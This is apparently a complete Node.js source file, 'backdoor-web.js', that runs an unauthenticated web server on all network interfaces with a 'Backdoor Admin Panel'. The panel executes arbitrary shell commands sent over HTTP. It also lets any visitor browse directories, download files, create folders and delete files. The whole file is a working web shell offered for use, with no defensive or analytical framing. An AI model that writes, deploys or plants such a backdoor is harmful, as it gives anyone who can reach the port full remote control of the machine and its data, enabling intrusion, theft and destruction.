// backdoor-web.js
import http from 'http';
import fs from 'fs';
import path from 'path';
import { spawn } from 'child_process';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const PORT = process.argv[2] || process.env.BACKDOOR_PORT || 8080;
const HOST = '0.0.0.0'; // Bind to all interfaces for remote access
let currentDir = process.cwd();

// Client-side path join helper
function clientPathJoin(dir, name) {
  return dir.endsWith('/') ? `${dir}${name}` : `${dir}/${name}`;
}

// HTML template for main page (embedded for self-contained, no login)
const MAIN_HTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Backdoor Admin</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1e1e1e; color: #fff; }
        .tab { display: none; }
        .tab.active { display: block; }
        button { background: #333; color: #fff; border: 1px solid #555; padding: 8px; margin: 5px; cursor: pointer; }
        button:hover { background: #555; }
        input, textarea { background: #333; color: #fff; border: 1px solid #555; padding: 5px; width: 100%; box-sizing: border-box; }
        #output { background: #000; color: #0f0; padding: 10px; height: 300px; overflow-y: scroll; font-family: monospace; white-space: pre-wrap; }
        #fileList { background: #222; padding: 10px; }
        .file { padding: 5px; border-bottom: 1px solid #444; }
        .dir { color: #4af; }
        .file-link { color: #afa; text-decoration: none; }
        .file-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div id="main" style="display: block;">
        <h1>Backdoor Admin Panel</h1>
        <button id="btn-terminal">Terminal</button>
        <button id="btn-files">Files</button>
       
        <div id="terminal" class="tab active">
            <h2>Interactive Terminal</h2>
            <div id="output"></div>
            <input type="text" id="cmd" placeholder="Enter command...">
            <button id="btn-run">Run</button>
        </div>
       
        <div id="files" class="tab">
            <h2>File Browser</h2>
            <p>Current Dir: <span id="currDir"></span></p>
            <input type="text" id="newDir" placeholder="New dir name">
            <button id="btn-mkdir">Create Dir</button>
            <input type="file" id="upload" multiple>
            <button id="btn-upload">Upload</button>
            <div id="fileList"></div>
        </div>
    </div>
    <script>
        // Wait for DOM ready
        document.addEventListener('DOMContentLoaded', function() {
            let sessionId = null; // Not used now, but kept for future
            
            // Event listeners for static buttons
            document.getElementById('btn-terminal').addEventListener('click', () => showTab('terminal'));
            document.getElementById('btn-files').addEventListener('click', () => showTab('files'));
            document.getElementById('btn-run').addEventListener('click', runCmd);
            document.getElementById('btn-mkdir').addEventListener('click', mkDir);
            document.getElementById('btn-upload').addEventListener('click', uploadFiles);
            
            // Enter key for cmd input
            document.getElementById('cmd').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') runCmd();
            });
            
            function showTab(tab) {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.getElementById(tab).classList.add('active');
                if (tab === 'files') updateFiles();
            }
           
            function runCmd() {
                const cmdInput = document.getElementById('cmd');
                const cmd = cmdInput.value;
                if (!cmd) return;
                const out = document.getElementById('output');
                out.innerHTML += '> ' + cmd + '<br>';
                fetch('/cmd', { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'}, 
                    body: JSON.stringify({cmd}) 
                })
                .then(r => r.text())
                .then(data => {
                    // Replace newlines with <br> and escape HTML if needed
                    const escapedData = data.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
                    out.innerHTML += escapedData.replace(/\n/g, '<br>') + '<br>';
                    out.scrollTop = out.scrollHeight;
                })
                .catch(err => {
                    out.innerHTML += 'Error: ' + err.message + '<br>';
                    out.scrollTop = out.scrollHeight;
                });
                cmdInput.value = '';
            }
           
            function updateFiles() {
                fetch('/files')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('currDir').textContent = data.cwd;
                    const list = document.getElementById('fileList');
                    list.innerHTML = '<h3>Files:</h3>';
                    data.files.forEach(f => {
                        const div = document.createElement('div');
                        div.className = 'file';
                        if (f.isDir) {
                            // Use data attribute and event delegation for cd
                            const a = document.createElement('a');
                            a.href = '#';
                            a.className = 'file-link dir';
                            a.textContent = '📁 ' + f.name;
                            a.dataset.action = 'cd';
                            a.dataset.dir = f.name;
                            div.appendChild(a);
                        } else {
                            const fullPath = clientPathJoin(data.cwd, f.name);
                            const a = document.createElement('a');
                            a.href = '/download?file=' + encodeURIComponent(fullPath);
                            a.className = 'file-link';
                            a.textContent = '📄 ' + f.name;
                            a.target = '_blank'; // Open download in new tab
                            div.appendChild(a);
                            
                            const btn = document.createElement('button');
                            btn.textContent = 'Delete';
                            btn.dataset.action = 'rm';
                            btn.dataset.file = f.name;
                            div.appendChild(btn);
                        }
                        list.appendChild(div);
                    });
                    
                    // Add event delegation for dynamic elements
                    list.addEventListener('click', function(e) {
                        if (e.target.dataset.action === 'cd') {
                            cd(e.target.dataset.dir);
                        } else if (e.target.dataset.action === 'rm') {
                            rm(e.target.dataset.file);
                        }
                    });
                })
                .catch(err => console.error('Update files error:', err));
            }
           
            function cd(dir) {
                fetch('/cd', { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({dir}) 
                })
                .then(() => updateFiles());
            }
           
            function mkDir() {
                const newDirInput = document.getElementById('newDir');
                const name = newDirInput.value;
                if (!name) return;
                fetch('/mkdir', { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({name}) 
                })
                .then(() => { 
                    updateFiles(); 
                    newDirInput.value = ''; 
                });
            }
           
            function uploadFiles() {
                const input = document.getElementById('upload');
                if (input.files.length === 0) return;
                const formData = new FormData();
                Array.from(input.files).forEach(file => formData.append('files', file));
                fetch('/upload', { 
                    method: 'POST', 
                    body: formData
                })
                .then(r => r.text())
                .then(() => { 
                    updateFiles(); 
                    input.value = ''; 
                })
                .catch(err => alert('Upload error: ' + err.message));
            }
           
            function rm(file) {
                if (!confirm('Delete ' + file + '?')) return;
                fetch('/rm', { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({file}) 
                })
                .then(() => updateFiles());
            }
           
            // Client-side path join
            function clientPathJoin(p1, p2) { 
                return p1.endsWith('/') ? p1 + p2 : p1 + '/' + p2; 
            }
        });
    </script>
</body>
</html>`;

// Create server (no auth checks)
const server = http.createServer((req, res) => {
    const urlObj = new URL(req.url, `http://${req.headers.host}`);
   
    if (req.url === '/' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(MAIN_HTML);
        return;
    }
   
    if (req.url === '/cmd' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { cmd } = JSON.parse(body);
                if (!cmd) {
                    res.writeHead(400);
                    res.end('No command provided');
                    return;
                }
                const sh = spawn('sh', ['-c', cmd], { cwd: currentDir });
                let output = '';
                sh.stdout.on('data', data => output += data.toString());
                sh.stderr.on('data', data => output += data.toString());
                sh.on('close', () => {
                    res.writeHead(200, { 'Content-Type': 'text/plain' });
                    res.end(output);
                });
            } catch (e) {
                res.writeHead(400);
                res.end('Bad request');
            }
        });
        return;
    }
   
    if (req.url === '/files' && req.method === 'GET') {
        fs.readdir(currentDir, { withFileTypes: true }, (err, files) => {
            if (err) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: err.message }));
                return;
            }
            const fileList = files.map(f => ({ name: f.name, isDir: f.isDirectory() }));
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ cwd: currentDir, files: fileList }));
        });
        return;
    }
   
    if (req.url === '/cd' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { dir } = JSON.parse(body);
                if (!dir) {
                    res.writeHead(400);
                    res.end();
                    return;
                }
                const newDir = path.resolve(currentDir, dir);
                if (fs.existsSync(newDir) && fs.statSync(newDir).isDirectory()) {
                    currentDir = newDir;
                }
                res.writeHead(200);
                res.end();
            } catch (e) {
                res.writeHead(400);
                res.end();
            }
        });
        return;
    }
   
    if (req.url === '/mkdir' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { name } = JSON.parse(body);
                if (!name) {
                    res.writeHead(400);
                    res.end();
                    return;
                }
                fs.mkdir(path.join(currentDir, name), { recursive: true }, err => {
                    res.writeHead(err ? 500 : 200);
                    res.end();
                });
            } catch (e) {
                res.writeHead(400);
                res.end();
            }
        });
        return;
    }
   
    if (req.url === '/rm' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { file } = JSON.parse(body);
                if (!file) {
                    res.writeHead(400);
                    res.end();
                    return;
                }
                fs.unlink(path.join(currentDir, file), err => {
                    res.writeHead(err ? 500 : 200);
                    res.end();
                });
            } catch (e) {
                res.writeHead(400);
                res.end();
            }
        });
        return;
    }
   
    if (req.url.startsWith('/download?')) {
        const filePath = urlObj.searchParams.get('file');
        if (filePath && filePath.startsWith(currentDir)) {
            res.writeHead(200, { 
                'Content-Type': 'application/octet-stream', 
                'Content-Disposition': `attachment; filename="${path.basename(filePath)}"` 
            });
            const readStream = fs.createReadStream(filePath);
            readStream.on('error', () => {
                res.writeHead(404);
                res.end('File not found');
            });
            readStream.pipe(res);
        } else {
            res.writeHead(403);
            res.end('Forbidden');
        }
        return;
    }
   
    if (req.url === '/upload' && req.method === 'POST') {
        // Stub: Implement with formidable for full support
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('Upload endpoint ready but parsing not implemented. Install formidable for full support.');
        return;
    }
   
    res.writeHead(404);
    res.end('Not Found');
});

server.listen(PORT, HOST, () => {
    console.log(`Backdoor web server running at http://${HOST}:${PORT}`);
    console.log('No authentication enabled.');
});

// Graceful shutdown
process.on('SIGINT', () => server.close(() => process.exit(0)));
process.on('SIGTERM', () => server.close(() => process.exit(0)));
